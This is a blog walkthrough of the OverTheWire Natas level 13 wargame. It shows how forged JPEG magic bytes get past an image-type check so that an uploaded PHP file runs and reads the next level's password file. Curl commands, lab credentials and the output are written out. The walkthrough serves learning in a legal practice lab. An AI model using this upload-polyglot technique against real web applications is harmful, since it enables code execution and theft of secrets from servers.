---
date: '2026-10-09'
description: you call this security?
draft: false
title: natas-13
weight: 14
ShowToc: false
---

| info | value                                       |
|:-----|--------------------------------------------:|
| user | `natas13`                                   |
| pass | `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`          |
| host | `http://natas13.natas.labs.overthewire.org` |


## explanation

source code is identical to the level [prior](http://dat.vah.wtf/posts/overthewire/natas/shell/natas-12/), apart from one minor adjustment:

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
  echo "File is not an image";
}
```

as per [php manual](https://www.php.net/manual/en/function.exif-imagetype.php):

"`exif_imagetype()` reads the first bytes of an image and checks its signature"

this should feel fairly similar to [bandit 12](http://localhost:1313/posts/overthewire/bandit/bandit-12/), where you had to previously explore various [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures). this task is no different with the exception of creating your very own image!

head over to the [list of file signatures - jpg](https://en.wikipedia.org/wiki/List_of_file_signatures#mwAkM), then create your own image with the magic bytes:

```sh
printf '\xff\xd8\xff\xdb' > payload.jpg && file payload.jpg

# alternatively with a reverse dump:
printf '00000000: ffd8 ffdb' > payload.hex
xxd -r payload.hex > payload.jpg && file payload.jpg
```

both cases will return `payload.jpg: JPEG image data`, now the repetitive part: open the file as any other & copy paste the [previous task's payload](http://dat.vah.wtf/posts/overthewire/natas/shell/natas-12/) with the corrected user:

```sh
����
<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>
```

continue with submitting the file the same way we handled it in the [previous task](http://dat.vah.wtf/posts/overthewire/natas/shell/natas-12/) with one additional step - because curl interprets it as an actual `.jpg` file as well

```sh
# send it
curl http://natas13.natas.labs.overthewire.org \
-u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
-F "uploadedfile=@$HOME/payload.jpg" \
-F "filename=.php"
# The file upload/fe5rncylh7.php has been uploaded

# retrieve it
curl http://natas13.natas.labs.overthewire.org/upload/fe5rncylh7.php \
-u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
--output result && cat result
# ����
# A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

---

## why does this work?

because the condition deliberately looks for a *file signature*, which we can forge ourselves by either directly pasting, creating a reverse dump etc. you name it.

### why is it still being parsed afterwards?

because file signatures are primarily used to indicate the type of file that's being handled, basically the first few byte read will determine what the system will do with it. the exact same process is necessary to boot your pc - which you can funnily enough dump yourself if you're on linux: see [1](https://www.sharetechnote.com/html/Linux_MBR.html). the [unicode replacement characters](https://en.wikipedia.org/wiki/Specials_(Unicode_block)) at the top of the file are ignored, since php only parses whatever is inside `<? .. ?>`. so there is literally no worries for php to interpret the payload :)

```php
����
<?php echo "hi"; ?>

# ����
# hi
```
